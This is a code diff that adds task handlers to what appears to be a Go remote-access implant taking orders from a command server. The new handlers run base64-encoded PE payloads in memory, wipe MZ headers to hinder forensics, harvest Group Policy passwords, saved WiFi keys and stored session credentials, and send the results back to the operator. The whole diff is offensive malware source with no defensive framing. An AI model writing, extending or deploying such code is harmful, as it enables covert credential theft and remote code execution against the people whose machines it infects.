@@ -1559,6 +1559,82 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
+	// ── Parity aliases & stubs ───────────────────────────────────────────────
+
+	case "PE_EXEC":
+		if task.Payload == "" {
+			t.sendResult(task.ID, "", "PE_EXEC: empty payload")
+			return
+		}
+		pebytes, err := base64.StdEncoding.DecodeString(task.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "PE_EXEC: decode payload: "+err.Error())
+			return
+		}
+		t.sendResult(task.ID, execPE(pebytes, task.Args), "")
+
+	case "NETSTAT":
+		out, err := runShell("netstat -ano")
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "WIPE_MZ":
+		wipePEHeaders()
+		t.sendResult(task.ID, "[+] MZ header wiped", "")
+
+	case "GPP_HUNT":
+		creds, err := huntGPPPasswords()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
+	case "CRED_WIFI":
+		creds, err := stealWifiCreds()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		if len(creds) == 0 {
+			t.sendResult(task.ID, "[no saved WiFi profiles with keys found]", "")
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
+	case "SESSION_GOPHER":
+		creds, err := stealSessionCreds()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
+	case "DETECTED":
+		t.sendResult(task.ID, "[!] DETECTED flag acknowledged", "")
+
+	case "HOME", "USERPROFILE":
+		t.sendResult(task.ID, os.Getenv("USERPROFILE"), "")
+
+	case "USERDOMAIN":
+		t.sendResult(task.ID, os.Getenv("USERDOMAIN"), "")
+
+	case "TEMP":
+		v := os.Getenv("TEMP")
+		if v == "" {
+			v = os.Getenv("TMP")
+		}
+		t.sendResult(task.ID, v, "")
+
+	case "DISPLAY":
+		t.sendResult(task.ID, os.Getenv("DISPLAY"), "")
+
 	default:
 		t.sendResult(task.ID, "", "unknown task type: "+task.Type)
 	}
